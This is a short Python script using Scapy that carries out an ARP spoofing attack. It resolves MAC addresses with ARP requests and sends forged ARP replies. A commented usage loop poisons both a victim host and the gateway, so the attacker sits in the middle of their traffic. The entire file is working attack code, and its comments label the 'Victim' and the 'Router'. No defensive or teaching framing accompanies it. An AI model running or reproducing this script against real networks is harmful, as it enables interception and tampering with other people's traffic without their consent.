from scapy.all import *
import time
import sys

def get_mac(ip):

    # Scapy function to send an ARP request and get the MAC address
    arp_request = ARP(pdst=ip)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request

    ans, _ = srp(arp_request_broadcast, timeout=1, verbose=False)

    if ans:
        return ans[0][1].hwsrc
    return None

def spoof(target_ip, spoof_ip, target_mac):
    
    if not target_mac:
        print(f"[-] Could not find MAC address for {target_ip}")
        return

    # op=2 means "ARP Reply" (is-at)
    # pdst = "Who am I talking to?" (The Victim)
    # hwdst = "Victim's MAC Address" (ARP layer)
    # psrc = "Who am I pretending to be?" (The Router/Gateway)
    # Build proper packet with both Ethernet and ARP layers
    ether = Ether(dst=target_mac)  # Ethernet destination MAC
    arp = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    packet = ether / arp
    
    # send the packet (verbose=False hides the output)
    sendp(packet, verbose=False)  # Use sendp for layer 2 packets

# USAGE EXAMPLE in a loop:
# target_ip = "192.168.1.5" (Victim)
# gateway_ip = "192.168.1.1" (Router)
# target_mac = get_mac(target_ip)
# gateway_mac = get_mac(gateway_ip)
# print("[+] Starting ARP Spoofing...")
# sent_packets_count = 0
# while True:
#     spoof(target_ip, gateway_ip, target_mac)
#     spoof(gateway_ip, target_ip, gateway_mac)
#     sent_packets_count += 2
##    \r prints on the same line so it looks cleaner
#     print(f"\r[+] Packets sent: {sent_packets_count}", end="")
#     time.sleep(2)